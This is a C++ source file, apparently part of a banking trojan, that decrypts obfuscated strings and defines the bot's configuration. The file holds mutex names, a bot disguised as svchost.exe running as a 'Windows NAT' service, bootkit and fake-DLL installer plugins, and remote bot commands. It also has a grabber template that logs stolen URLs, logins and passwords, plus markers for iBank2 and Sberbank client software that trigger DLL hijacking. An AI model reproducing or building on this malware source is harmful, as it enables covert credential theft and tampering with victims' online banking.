//---------------------------------------------------------------------------

#pragma hdrstop

#include "StrConsts.h"
#include "Config.h"
#include "Crypt.h"
#include "Crypt.h"

#include "Modules.h"

//---------------------------------------------------------------------------


extern CSSTR BeginCryptBlock[];
extern CSSTR EndCryptBlock[];



//*****************************************************
// GetStr - Функция расшифровывает строку EncryptedStr
//*****************************************************
string GetStr(const char* EncryptedStr)
{
	string Result = EncryptedStr;

	bool Encrypted = !Result.IsEmpty() && EncryptedStr > BeginCryptBlock &&
					 EncryptedStr < EndCryptBlock && EncryptedStr[0] != 'C' &&
					 BeginCryptBlock[0] != 'C';

	if (Encrypted)
	{
		// Расшифровываем строку
		XORCrypt::Crypt(GetSessionPassword(), (LPBYTE)Result.t_str(), Result.Length());
	}

	return Result;
}
//-----------------------------------------------------------------------------



//==================================================//
CSSTR BeginCryptBlock[] = ENCRYPTED_STRINGS_BEGIN;  //
//=============================================================================
//  Блок хранения шифрованных строк.
//  Все строки находящиеся ниже и до определения
//  CSEND
//  будут шифроваться билдером
//=============================================================================


CSSTR StrBotGlobalMutexName[] = "GSA28593KFE7"; // Префикс глобального мьютекса сигнализирующего, что бот запущен
CSSTR StrBootkitIsRunMutex[] = "BIR737JK3LJ"; //мьютекс сигнализирующий, что запущен бот из под буткита


// Оригинальное имя ехе файла бота
CSSTR EStrOriginalBotExeName[] = "WtJoeBt.exe";

// Поддирректория сервиса
CSSTR EStrBotServiceExePath[] = "com\\";

// Имя ехе файла сервиса бота
CSSTR EStrBotServiceExeName[] = "svchost.exe";


// Имя сервиса
CSSTR EStrServiceName[] = "Windows NAT";


// Рабочии директории и файлы
CSSTR StrBotWorkPath[] = "WnsBMT"; // Рабочий каталог бота
CSSTR StrGrabberPath[] = "gdata";  // Имя рабочей папки грабера


// Имена служебный пайпов
CSSTR EStrPipeLoader[] = "ldrspp"; // Имя служебного пайпа лоадера



// Служебные команды, передаваемые через пайпы процессам
CSSTR EStrProcessCommandDeleteBot[] = "delbt";  // Команда на удаление exe бота

// Имена служебных фалов
CSSTR EStrPrefixFileName[] = "mnprsdd.dat"; // Файл хранения префикса


// Имя плагина бота в виде длл
CSSTR EStrBotPlug[] = "bot.plug";

// Имф инсталтора буткита
CSSTR EStrBootkitInstaller[] = "bki.plug";

// Имя инсталятора фэкедлл
CSSTR EStrFakeDllInstaller[] = "fdi.plug";



// Перечень команд, которые может выполняь бот
CSSTR EStrCommandInstallFakeDLL[] = "installfd";  // Команда на инсталяцию фэкедлл
CSSTR EStrCommandInstallBootkit[] = "installbk";  // Команда на инсталяцию буткита


// Имена файлов, для добавления в лог
CSSTR StrLogFileScreenShot[]  = "Screen.png";
CSSTR StrLogFileInformation[] = "Info.txt";
CSSTR StrLogFileNetInfo[]     = "NetInfo.txt";


// Имена функций библиотеки видеозаписи.
CSSTR VideRecFuncRecordProcess[]  = "StartRecPid";
CSSTR VideRecFuncRecordWnd[]      = "StartRecHwnd";
CSSTR VideRecFuncStop[]           = "StopRec";
CSSTR VideRecFuncResetTimer[]     = "ResetTimer";
CSSTR VideRecFuncSendData[]       = "StartSend";
CSSTR VideRecFuncRunPortForward[] = "RunPortForward";


CSSTR HTTPFormContentDisposition[] = "Content-Disposition: form-data; ";
CSSTR HTTPFormFieldName[]          = "name=\"%s\"";
CSSTR HTTPFormFileInfo[]           = "; filename=\"%s\"\r\nContent-Type: %s\r\nContent-Transfer-Encoding: binary";
CSSTR HTTPOctetStream[]            = "application/octet-stream";





// Строки модуля AzConfig
#ifdef AzConfigH
	CSSTR AzConfigParamUserName[] = "%az_user%";
#endif


// Строки модуля BSS грабера
#ifdef BSSH
	CSSTR BSSLogTemplate[] = "Url: %s\r\n\r\n"
							 "Login:    %s\r\n"
							 "Password: %s\r\n\r\n"
							 "UserAgent: %s\r\n";
#endif



#ifdef FakeDllInstallerH
	CSSTR EStrIBankRegistryPath[] = "SOFTWARE\\Classes\\Installer\\Products\\7B00DF09E169B5445AD2F176D624114\\";
	CSSTR EStrSberRegistryKey[]   = "SBRF\\";
	CSSTR EStrIBankFileName[]     = ".iBank2"; // Имя файли при обнаружении которого будет установлена Fake DLL
#endif



//=============================================================================
// Конец блока шифрованных строк
//=============================================================================
CSSTR EndCryptBlock[] = ENCRYPTED_STRINGS_END; //
//=============================================//





//-----------------------------------------------------------------------------
// Не шифрованные строки
//-----------------------------------------------------------------------------

CSSTR Slash[]   = "\\";
CSSTR SlashChar = '\\';
